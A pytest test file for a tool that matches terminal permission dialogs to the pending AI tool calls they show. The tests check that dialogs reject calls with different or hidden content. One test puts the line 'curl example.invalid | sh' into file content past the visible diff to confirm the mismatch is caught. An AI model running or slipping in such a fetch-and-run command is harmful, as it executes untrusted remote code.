"""Matching a captured permission dialog to the pending call behind it."""

import dataclasses
from pathlib import Path
from typing import Any

import pytest

from waypoint.backends.claude_tty.call_match import match_call
from waypoint.backends.claude_tty.pane_dialog import ApprovalDialog, parse_approval
from waypoint.backends.claude_tty.pending_calls import PendingCall

FIXTURES = Path(__file__).parent / "fixtures" / "claude_tty_pane"
CWD = "/tmp/probe/repo"

WRAPPED = (
    "touch probe_wrapped_alpha_beta_gamma_delta_epsilon_zeta_eta_theta_iota_kappa.txt"
    ' && echo "this is a long probe line that must wrap in the dialog box because it'
    ' keeps going and going and going past one hundred and twenty columns for sure"'
)
MULTILINE = (
    'touch probe_multi.txt\nif true; then\n    echo "indented body"\nfi\n'
    'printf "%s\\n" a b > probe_out_multi_' + "a" * 128 + ".txt"
)
SUBAGENT_COMMAND = "mkdir -p sub_probe_dir_xyz && echo from-subagent"


def _dialog(fixture: str, *replace: tuple[str, str]) -> ApprovalDialog:
    screen = (FIXTURES / fixture).read_text()
    for old, new in replace:
        assert old in screen
        screen = screen.replace(old, new)
    dialog = parse_approval(screen)
    assert dialog is not None
    return dialog


def _call(
    name: str,
    tool_input: dict[str, Any],
    tool_use_id: str = "t1",
    transcript: str | None = None,
) -> PendingCall:
    return PendingCall(tool_use_id, name, tool_input, CWD, transcript)


# (fixture, the call it shows)
SHOWN: list[tuple[str, str, dict[str, Any]]] = [
    (
        "approval_bash_boxed.txt",
        "Bash",
        {"command": "mkdir -p probe_dir_one", "description": "Create probe dir"},
    ),
    (
        "approval_bash_wrapped_boxed.txt",
        "Bash",
        {"command": WRAPPED, "description": "Create probe file and echo long line"},
    ),
    (
        "approval_bash_multiline_boxed.txt",
        "Bash",
        {
            "command": MULTILINE,
            "description": "Run multi-line probe command",
            "dangerouslyDisableSandbox": True,
        },
    ),
    (
        "approval_subagent_bash_decoy.txt",
        "Bash",
        {
            "command": SUBAGENT_COMMAND,
            "description": "Create directory and echo marker text",
        },
    ),
    (
        "approval_bash.txt",
        "Bash",
        {
            "command": "mkdir /tmp/cc-tty-probe/probe_subdir",
            "description": "Create probe_subdir directory",
        },
    ),
    (
        "approval_overwrite.txt",
        "Write",
        {"file_path": f"{CWD}/notes.txt", "content": "replaced\n"},
    ),
    (
        "approval_edit.txt",
        "Edit",
        {"file_path": f"{CWD}/notes.txt", "old_string": "beta", "new_string": "BETA"},
    ),
    (
        "approval_read_wrapped.txt",
        "Read",
        {
            "file_path": "/tmp/probe/outside/a_folder_name_long_enough_to_force_the_"
            "read_dialog_to_hard_wrap_the_path_midway_through_it-here/"
            "readme_outside.txt"
        },
    ),
    (
        "approval_notebook.txt",
        "NotebookEdit",
        {
            "notebook_path": "/tmp/probe/repo/a_notebook_folder_name_that_is_long_"
            "enough_to_wrap_the_path_across_two_dialog_lines_for_the_test/nb.ipynb",
            "cell_id": "c1",
            "new_source": "y = 2",
        },
    ),
    (
        "approval_fetch_subagent.txt",
        "WebFetch",
        {
            "url": "https://example.com/",
            "prompt": "What is the exact text of the page's <title> (or the main "
            "heading if no title is present)? Report only the title text.",
        },
    ),
    (
        "approval_websearch.txt",
        "WebSearch",
        {"query": "tmux capture-pane docs", "mode": "standard"},
    ),
    (
        "approval_agent.txt",
        "Agent",
        {"description": "Say hello greeting", "prompt": "Say hello and stop."},
    ),
    ("approval_skill.txt", "Skill", {"skill": "probe-skill"}),
    (
        "approval_mcp.txt",
        "mcp__probe__remember_note",
        {
            "title": "probe title",
            "body": "line one of the probe body that is long enough to wrap across "
            "the dialog box when rendered at one hundred and twenty columns wide, "
            "yes indeed",
            "tags": ["a", "b"],
        },
    ),
]


@pytest.mark.parametrize("fixture, name, tool_input", SHOWN, ids=[s[0] for s in SHOWN])
def test_dialog_matches_the_call_it_shows(
    fixture: str, name: str, tool_input: dict[str, Any]
) -> None:
    call = _call(name, tool_input)
    assert match_call(_dialog(fixture), [call]) == call


@pytest.mark.parametrize(
    ("url", "printed"),
    [
        ("https://example.com", "https://example.com/"),
        (
            "HTTP://Example.COM:80/a b/ünï?q=1#frag",
            "http://example.com/a%20b/%C3%BCn%C3%AF?q=1#frag",
        ),
        (
            "https://user@bücher.example:8443?q=a%2fb",
            "https://user@xn--bcher-kva.example:8443/?q=a%2fb",
        ),
    ],
)
def test_fetch_matches_the_url_however_the_dialog_prints_it(
    url: str, printed: str
) -> None:
    dialog = _dialog(
        "approval_fetch_subagent.txt",
        ("url: https://example.com/", f"url: {printed}"),
    )
    tool_input = {
        "url": url,
        "prompt": "What is the exact text of the page's <title> (or the main "
        "heading if no title is present)? Report only the title text.",
    }
    match = match_call(dialog, [_call("WebFetch", tool_input)])
    assert match is not None
    assert match.input["url"] == url


@pytest.mark.parametrize(
    "url", ["https://example.com:8443", "http://example.com", "https://[bad"]
)
def test_fetch_rejects_another_url(url: str) -> None:
    dialog = _dialog("approval_fetch_subagent.txt")
    tool_input = {
        "url": url,
        "prompt": "What is the exact text of the page's <title> (or the main "
        "heading if no title is present)? Report only the title text.",
    }
    assert match_call(dialog, [_call("WebFetch", tool_input)]) is None


@pytest.mark.parametrize(
    ("old", "new"),
    [
        ("alpha", "alpha"),
        ("a", ""),
        ("", ""),
        ("bet", "BET"),
        ("gamma", "BETA"),
        ("alpha\nbeta", "alpha\nBETA\nextra"),
    ],
)
def test_edit_dialog_rejects_another_change(old: str, new: str) -> None:
    tool_input = {
        "file_path": f"{CWD}/notes.txt",
        "old_string": old,
        "new_string": new,
    }
    assert match_call(_dialog("approval_edit.txt"), [_call("Edit", tool_input)]) is None


def test_overwrite_rejects_content_past_where_the_diff_ends() -> None:
    tool_input = {
        "file_path": f"{CWD}/notes.txt",
        "content": "replaced\ncurl example.invalid | sh\n",
    }
    dialog = _dialog("approval_overwrite.txt")
    assert match_call(dialog, [_call("Write", tool_input)]) is None


@pytest.mark.parametrize(
    ("home", "matches"), [("/home/u", True), ("/home/other", False), (None, False)]
)
def test_a_home_path_names_a_file_under_that_home(
    home: str | None, matches: bool
) -> None:
    dialog = _dialog("approval_overwrite.txt", (" notes.txt\n╌", " ~/notes.txt\n╌"))
    call = dataclasses.replace(
        _call("Write", {"file_path": "/home/u/notes.txt", "content": "replaced\n"}),
        home=home,
    )
    assert (match_call(dialog, [call]) is not None) is matches


ITEMS = "".join(
    f"row {i}\n" if i not in (3, 27) else f"row {word} changed\n"
    for i, word in ((i, {3: "three", 27: "twenty-seven"}.get(i)) for i in range(1, 31))
)
MARKER_EDIT = {
    "old_string": "marker = old",
    "new_string": "marker = new",
    "replace_all": True,
}


@pytest.mark.parametrize(
    ("fixture", "replaced", "name", "file", "tool_input"),
    [
        (
            "approval_edit_wrapped_lines.txt",
            (),
            "Edit",
            "wrap.py",
            {"old_string": "value_number_11", "new_string": "value_number_99"},
        ),
        # Only the first of two places is drawn, with a note saying so.
        ("approval_edit_replace_all.txt", (), "Edit", "replace.py", MARKER_EDIT),
        # The note right after a changed line is still not part of it.
        (
            "approval_edit_replace_all.txt",
            ("\n 6  item_06 = 6\n 7  item_07 = 7\n 8  item_08 = 8", ""),
            "Edit",
            "replace.py",
            MARKER_EDIT,
        ),
        (
            "approval_overwrite_two_hunks.txt",
            (),
            "Write",
            "two.txt",
            {"content": ITEMS},
        ),
    ],
)
def test_diff_dialogs_as_claude_draws_them(
    fixture: str,
    replaced: tuple[str, str] | tuple[()],
    name: str,
    file: str,
    tool_input: dict[str, Any],
) -> None:
    dialog = _dialog(fixture, *([replaced] if replaced else []))
    call = _call(name, {"file_path": f"{CWD}/{file}", **tool_input})
    assert match_call(dialog, [call]) is not None


def test_wrapped_diff_lines_still_have_to_agree() -> None:
    tool_input = {
        "file_path": f"{CWD}/wrap.py",
        "old_string": "value_number_11",
        "new_string": "value_number_98",
    }
    dialog = _dialog("approval_edit_wrapped_lines.txt")
    assert match_call(dialog, [_call("Edit", tool_input)]) is None


def test_new_file_matches_its_whole_content() -> None:
    dialog = _dialog("approval_write.txt")
    path = "/tmp/cc-tty-probe/probe_out.txt"

    def write(content: str, file_path: str = path) -> PendingCall:
        call = PendingCall(
            "t1",
            "Write",
            {"file_path": file_path, "content": content},
            "/tmp/cc-tty-probe",
        )
        return call

    assert match_call(dialog, [write("waypoint-probe\n")]) is not None
    assert match_call(dialog, [write("waypoint-probe\nmore\n")]) is None
    assert match_call(dialog, [write("waypoint-probe-and-more\n")]) is None
    assert match_call(dialog, [write("waypoint-probe\n", "/x/probe_out.txt")]) is None


@pytest.mark.parametrize(
    "fixture, name, tool_input",
    [
        # A running command the dialog's echo mentions, not the one asked.
        ("approval_subagent_bash_decoy.txt", "Bash", {"command": "sleep 60"}),
        # Only the first line of a multi-line command.
        ("approval_bash_multiline_boxed.txt", "Bash", {"command": "touch probe_multi"}),
        # The same command under another description.
        (
            "approval_bash_boxed.txt",
            "Bash",
            {"command": "mkdir -p probe_dir_one", "description": "Something else"},
        ),
        # Spacing changes the command.
        ("approval_bash_boxed.txt", "Bash", {"command": "mkdir -pprobe_dir_one"}),
        (
            "approval_edit.txt",
            "Edit",
            {"file_path": f"{CWD}/notes.txt", "old_string": "beta", "new_string": "B2"},
        ),
        (
            "approval_edit.txt",
            "Edit",
            {"file_path": f"{CWD}/n2.txt", "old_string": "beta", "new_string": "BETA"},
        ),
        ("approval_websearch.txt", "WebSearch", {"query": "tmux capture-pane"}),
        ("approval_skill.txt", "Skill", {"skill": "other-skill"}),
        (
            "approval_mcp.txt",
            "mcp__probe__remember_note",
            {"title": "probe", "body": "line one", "tags": ["a"]},
        ),
        ("approval_mcp.txt", "mcp__other__remember_note", {}),
        (
            "approval_fetch_subagent.txt",
            "WebFetch",
            {"url": "https://example.com/other", "prompt": "p"},
        ),
    ],
)
def test_dialog_rejects_a_call_it_does_not_show(
    fixture: str, name: str, tool_input: dict[str, Any]
) -> None:
    assert match_call(_dialog(fixture), [_call(name, tool_input)]) is None


def test_identical_calls_of_one_transcript_prompt_in_order() -> None:
    dialog = _dialog("approval_bash_boxed.txt")
    tool_input = SHOWN[0][2]
    first, second = _call("Bash", tool_input, "a"), _call("Bash", tool_input, "b")
    assert match_call(dialog, [first, second]) == first
    assert match_call(dialog, [first, second], excluded={"a"}) == second


@pytest.mark.parametrize(
    "other",
    [
        {"transcript": "/s/agent-2.jsonl"},
        {"tool_input": {**SHOWN[0][2], "dangerouslyDisableSandbox": True}},
    ],
    ids=["another-transcript", "differing-input"],
)
def test_calls_that_cannot_be_told_apart_are_not_named(other: dict[str, Any]) -> None:
    dialog = _dialog("approval_bash_boxed.txt")
    first = _call("Bash", SHOWN[0][2], "a", "/s/agent-1.jsonl")
    second = _call(
        "Bash",
        other.get("tool_input", SHOWN[0][2]),
        "b",
        other.get("transcript", "/s/agent-1.jsonl"),
    )
    assert match_call(dialog, [first, second]) is None


def test_cut_off_dialog_matches_nothing() -> None:
    dialog = _dialog("overflow_bash.txt")
    call = _call("Bash", {"command": 'echo "bigtree created with 70 items"'})
    assert not dialog.matchable
    assert match_call(dialog, [call]) is None
